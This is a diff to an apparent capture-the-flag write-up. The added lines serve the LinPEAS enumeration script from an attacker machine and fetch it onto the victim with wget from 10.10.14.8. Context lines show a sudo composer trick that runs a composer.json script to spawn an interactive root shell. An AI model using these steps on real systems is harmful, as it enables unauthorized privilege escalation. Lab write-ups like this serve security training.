@@ -67,6 +67,14 @@ Login attempt with the cry0l1t3 user was successed and we got the user.txt flag
 User2
 ---------
 Let's use [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to find some privilege escalation vector
+We need to start http-sever on Kali using following command
+````
+Python -m SimpleHTTPServer
+````
+And then we can download the script to victim system using wget
+````
+wget http://10.10.14.8:8000/linpeas.sh
+````
 TF=$(mktemp -d)
 echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
 sudo composer --working-dir=$TF run-script x
